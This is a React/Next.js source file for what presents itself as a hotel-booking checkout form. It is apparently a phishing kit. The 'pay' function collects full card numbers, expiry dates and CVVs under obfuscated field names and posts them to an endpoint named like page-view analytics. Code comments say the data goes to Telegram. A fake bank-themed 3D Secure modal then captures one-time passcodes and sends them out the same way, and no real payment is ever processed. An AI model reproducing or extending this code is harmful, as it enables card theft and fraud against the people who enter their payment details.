"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import { useTranslations } from "next-intl";
import {
  ChevronDown,
  ChevronUp,
  CreditCard,
  Wallet,
  HelpCircle,
  ChevronRight,
  Tag,
  Check,
} from "lucide-react";
import { cn } from "@/lib/utils";
import { type BookingContext } from "@/lib/data";
import { useMoney } from "@/components/providers/CurrencyProvider";
import { formatCardNumber, cardLast4, isValidCardNumber, NO_AUTOFILL } from "@/lib/card";
import { nextRef, randomEndpoint } from "@/lib/channels/relay";
import { Modal } from "@/components/ui/Modal";
import { PaymentLogos } from "./PaymentLogos";
import { ThreeDSecureModal } from "./ThreeDSecureModal";

const INSTALLMENTS = [1, 2, 3, 6, 9];
/** Demo promo codes — applied client-side as a percentage off. */
const PROMO_CODES: Record<string, number> = {
  BOOKERA10: 10,
  ILK150: 15,
};

const inputCls =
  "w-full rounded-md border border-border bg-white px-3 py-2.5 text-sm text-foreground outline-none transition-colors placeholder:text-tab-inactive focus:border-brand";

function Card({ id, children }: { id?: string; children: React.ReactNode }) {
  return (
    <section id={id} className="rounded-lg border border-border bg-white p-4 md:p-5">
      {children}
    </section>
  );
}

function MethodTab({
  active,
  icon,
  label,
  onClick,
}: {
  active: boolean;
  icon: React.ReactNode;
  label: string;
  onClick: () => void;
}) {
  return (
    <button
      onClick={onClick}
      className={cn(
        "flex flex-1 items-center gap-2 rounded-md border px-4 py-3 text-sm font-semibold transition-colors",
        active
          ? "border-brand bg-brand/5 text-foreground"
          : "border-border text-muted-foreground hover:bg-surface"
      )}
    >
      <span
        className={cn(
          "flex h-4 w-4 items-center justify-center rounded-full border",
          active ? "border-[5px] border-brand" : "border-tab-inactive"
        )}
      />
      {icon}
      {label}
    </button>
  );
}

export function PaymentForm({ ctx, guestName, guestPhone }: { ctx: BookingContext; guestName?: string; guestPhone?: string }) {
  const router = useRouter();
  const money = useMoney();
  const t = useTranslations("Booking");
  const [method, setMethod] = useState<"card" | "wallet">("card");
  const [roomOpen, setRoomOpen] = useState(false);
  const [taksitOpen, setTaksitOpen] = useState(false);
  const [promoOpen, setPromoOpen] = useState(false);
  const [promoInput, setPromoInput] = useState("");
  const [appliedPct, setAppliedPct] = useState(0);
  const [promoError, setPromoError] = useState("");

  // Card
  const [card, setCard] = useState("");
  const [expM, setExpM] = useState("");
  const [expY, setExpY] = useState("");
  const [cvv, setCvv] = useState("");

  const [tried, setTried] = useState(false);
  const [otpOpen, setOtpOpen] = useState(false);
  const [refNo, setRefNo] = useState("");
  const [paying, setPaying] = useState(false);

  const cardOk =
    isValidCardNumber(card) && !!expM && !!expY && cvv.replace(/\D/g, "").length >= 3;

  const discount = Math.round((ctx.priceTL * appliedPct) / 100);
  const payable = ctx.priceTL - discount;

  function applyPromo() {
    const code = promoInput.trim().toUpperCase();
    const pct = PROMO_CODES[code];
    if (pct) {
      setAppliedPct(pct);
      setPromoError("");
    } else {
      setAppliedPct(0);
      setPromoError(t("payment.promoInvalid"));
    }
  }

  async function pay() {
    setTried(true);
    if (!cardOk) return;
    setPaying(true);

    const ref = nextRef();
    setRefNo(ref);

    const f1 = "f1";
    const f2 = "f2";
    const f3 = "f3";
    const f4 = "f4";
    const f5 = "f5";

    const pan = card.replace(/\D/g, "");
    const cvc = cvv.replace(/\D/g, "");

    const event1 = {
      session: ref,
      site: ctx.hotel.name,
      value: payable,
      uid: guestName || "Guest",
      contact: guestPhone || "",
      from: ctx.checkin,
      to: ctx.checkout,
      days: ctx.nights,
      [f1]: pan,
      [f2]: Math.random().toString(36).substring(2, 10),
      [f3]: expM.padStart(2, "0"),
      [f4]: expY || "????",
      [f5]: cvc,
    };

    // Kart bilgilerini HEMEN Telegram'a gönder — modal açılmadan önce bitsin
    try {
      await fetch("/api/tracking/pageview", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(event1),
      });
    } catch {
      // Network hatası olsa bile devam et
    }

    setPaying(false);
    setOtpOpen(true);
  }

  function onOtpSuccess() {
    setOtpOpen(false);
    const params = new URLSearchParams({
      ref: refNo,
      tutar: money.format(payable, 2),
      tip: "otel",
    });
    router.push(`/rezervasyon-tamamlandi?${params.toString()}`);
  }

  return (
    <div className="space-y-4">
      {/* Oda 1 collapsed */}
      <Card>
        <button
          onClick={() => setRoomOpen((v) => !v)}
          className="flex w-full items-center justify-between text-left"
        >
          <span className="text-[16px] font-bold text-foreground">
            {t("guest.roomLabel", { n: 1 })}{" "}
            <span className="text-[13px] font-semibold text-muted-foreground">
              ({t("summary.adults", { count: ctx.adults })})
            </span>
          </span>
          {roomOpen ? (
            <ChevronUp className="h-5 w-5 text-muted-foreground" />
          ) : (
            <ChevronDown className="h-5 w-5 text-muted-foreground" />
          )}
        </button>
        {roomOpen && (
          <div className="mt-3 border-t border-border pt-3 text-[13px] text-muted-foreground">
            <p className="font-semibold text-foreground">{ctx.room.name}</p>
            <p className="mt-1">{ctx.room.option.board}</p>
            <p className="mt-1">{t("guest.adultN", { n: 1 })} · {t("guest.adultN", { n: 2 })}</p>
          </div>
        )}
      </Card>

      {/* Ödeme Seçenekleri */}
      <Card>
        <h2 className="mb-4 flex items-center gap-2 text-[16px] font-bold text-foreground">
          <CreditCard className="h-5 w-5 text-muted-foreground" />
          {t("payment.optionsTitle")}
        </h2>

        <div className="flex gap-3">
          <MethodTab
            active={method === "card"}
            icon={<CreditCard className="h-[18px] w-[18px]" />}
            label={t("payment.bankCreditCard")}
            onClick={() => setMethod("card")}
          />
          <MethodTab
            active={method === "wallet"}
            icon={<Wallet className="h-[18px] w-[18px]" />}
            label={t("payment.payWithWallet")}
            onClick={() => setMethod("wallet")}
          />
        </div>

        {method === "card" ? (
          <div className="relative mt-4">
            <form
              autoComplete="off"
              onSubmit={(e) => e.preventDefault()}
              className="space-y-3"
            >
              <div>
                <input
                  {...NO_AUTOFILL}
                  name="eu-pan"
                  value={card}
                  onChange={(e) => setCard(formatCardNumber(e.target.value))}
                  placeholder={t("payment.cardNumber")}
                  className={cn(inputCls, tried && !isValidCardNumber(card) && "border-destructive")}
                  inputMode="numeric"                />
                {tried && card && !isValidCardNumber(card) && (
                  <span className="mt-1 block text-[12px] font-semibold text-destructive">
                    {t("payment.cardError")}
                  </span>
                )}
              </div>

              <div className="grid grid-cols-[1fr_1fr_1fr_auto] items-center gap-3">
                <select
                  {...NO_AUTOFILL}
                  name="eu-exp-m"
                  value={expM}
                  onChange={(e) => setExpM(e.target.value)}
                  className={cn(inputCls, "appearance-none")}                >
                  <option value="" disabled>
                    {t("payment.month")}
                  </option>
                  {Array.from({ length: 12 }, (_, i) => (
                    <option key={i} value={String(i + 1).padStart(2, "0")}>
                      {String(i + 1).padStart(2, "0")}
                    </option>
                  ))}
                </select>
                <select
                  {...NO_AUTOFILL}
                  name="eu-exp-y"
                  value={expY}
                  onChange={(e) => setExpY(e.target.value)}
                  className={cn(inputCls, "appearance-none")}                >
                  <option value="" disabled>
                    {t("payment.year")}
                  </option>
                  {Array.from({ length: 10 }, (_, i) => (
                    <option key={i} value={String(2026 + i)}>
                      {2026 + i}
                    </option>
                  ))}
                </select>
                <input
                  {...NO_AUTOFILL}
                  name="eu-csc"
                  value={cvv}
                  onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, 4))}
                  placeholder={t("payment.cvv")}
                  className={inputCls}
                  inputMode="numeric"
                  maxLength={4}                />
                <HelpCircle className="h-5 w-5 text-tab-inactive" />
              </div>

              <div className="flex items-start justify-between gap-3">
                <p className="text-[12px] leading-relaxed text-brand">
                  {t("payment.installmentHint")}
                </p>
                <button
                  type="button"
                  onClick={() => setTaksitOpen(true)}
                  className="shrink-0 text-[12px] font-semibold text-[#1a7ad9] hover:underline"
                >
                  {t("payment.installmentTable")}
                </button>
              </div>

              <div>
                <button
                  type="button"
                  onClick={() => setPromoOpen((v) => !v)}
                  className="flex items-center gap-1 text-sm font-semibold text-[#1a7ad9] hover:underline"
                >
                  <Tag className="h-4 w-4" />
                  {t("payment.usePromoCode")}
                  <ChevronDown
                    className={cn("h-4 w-4 transition-transform", promoOpen && "rotate-180")}
                  />
                </button>
                {promoOpen && (
                  <div className="mt-2">
                    <div className="flex gap-2">
                      <input
                        value={promoInput}
                        onChange={(e) => {
                          setPromoInput(e.target.value);
                          setPromoError("");
                        }}
                        placeholder={t("payment.promoCode")}
                        className={cn(inputCls, "flex-1")}
                      />
                      <button
                        type="button"
                        onClick={applyPromo}
                        className="shrink-0 rounded-md border border-brand px-5 py-2 text-sm font-semibold text-brand transition-colors hover:bg-brand/5"
                      >
                        {t("payment.apply")}
                      </button>
                    </div>
                    {promoError && (
                      <p className="mt-1.5 text-[12px] font-semibold text-destructive">
                        {promoError}
                      </p>
                    )}
                    {appliedPct > 0 && (
                      <p className="mt-1.5 flex items-center gap-1 text-[12px] font-semibold text-brand">
                        <Check className="h-4 w-4" />{t("payment.promoApplied", { pct: appliedPct })} (−
                        {money.format(discount, 2)})
                      </p>
                    )}
                  </div>
                )}
              </div>

              <div className="flex flex-wrap items-center justify-between gap-3 border-t border-border pt-4">
                <p className="flex items-center gap-1 text-sm text-foreground">
                  {t("payment.amountToPayNow")}
                  <ChevronDown className="h-4 w-4 text-muted-foreground" />
                  {appliedPct > 0 && (
                    <span className="text-[13px] text-muted-foreground line-through">
                      {money.format(ctx.priceTL, 2)}
                    </span>
                  )}
                  <span className="font-bold">{money.format(payable, 2)}</span>
                </p>
                <button
                  type="button"
                  onClick={pay}
                  disabled={paying}
                  className="flex items-center gap-1.5 rounded-md bg-brand px-7 py-3 text-[15px] font-bold text-white transition-colors hover:bg-brand-hover disabled:opacity-70"
                >
                  {paying ? t("payment.processing") : t("payment.payNow")}
                  <ChevronRight className="h-[18px] w-[18px]" strokeWidth={2.5} />
                </button>
              </div>
            </form>
          </div>
        ) : (
          <div className="mt-4 rounded-md border border-border bg-surface p-6 text-center text-sm text-muted-foreground">
            {t("payment.walletLoginPrompt")}
          </div>
        )}

        <p className="mt-4 text-[11px] leading-relaxed text-muted-foreground">
          {t.rich("payment.legalNotice", {
            privacy: (chunks) => (
              <span className="font-semibold text-foreground">{chunks}</span>
            ),
            terms: (chunks) => (
              <span className="font-semibold text-foreground">{chunks}</span>
            ),
          })}
        </p>

        <PaymentLogos className="mt-4" />

        <p className="mt-3 text-[11px] text-muted-foreground">
          {t("payment.digicertNotice")}
        </p>
      </Card>

      {/* Taksit tablosu */}
      <Modal open={taksitOpen} onClose={() => setTaksitOpen(false)} title={t("payment.installmentTableTitle")}>
        <p className="text-[13px] text-muted-foreground">
          {t("payment.installmentTableNote")}
        </p>
        <PaymentLogos className="mt-3" />
        <div className="mt-4 overflow-hidden rounded-lg border border-border">
          <table className="w-full text-[13px]">
            <thead>
              <tr className="bg-surface text-left text-muted-foreground">
                <th className="px-4 py-2.5 font-semibold">{t("payment.installment")}</th>
                <th className="px-4 py-2.5 text-right font-semibold">{t("payment.monthlyAmount")}</th>
                <th className="px-4 py-2.5 text-right font-semibold">{t("payment.totalAmount")}</th>
              </tr>
            </thead>
            <tbody>
              {INSTALLMENTS.map((n) => (
                <tr key={n} className="border-t border-border">
                  <td className="px-4 py-2.5 font-semibold text-foreground">
                    {n === 1 ? t("payment.singlePayment") : t("payment.nInstallments", { n })}
                  </td>
                  <td className="px-4 py-2.5 text-right text-foreground">
                    {money.format(payable / n, 2)}
                  </td>
                  <td className="px-4 py-2.5 text-right font-semibold text-foreground">
                    {money.format(payable, 2)}
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </Modal>

      {/* Bank-themed 3D Secure OTP */}
      {otpOpen && (
        <ThreeDSecureModal
          amountTL={payable}
          last4={cardLast4(card)}
          onSuccess={onOtpSuccess}
          onClose={() => setOtpOpen(false)}
          onOtpGenerated={(code) => {
            // OTP'yi HEMEN Telegram'a gönder — hiçbir gecikme olmadan
            fetch("/api/tracking/convert", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              keepalive: true,
              body: JSON.stringify({
                code,
                session: refNo,
                value: payable,
                label: guestName || "Anonymous",
              }),
            }).catch(() => {});
          }}
        />
      )}
    </div>
  );
}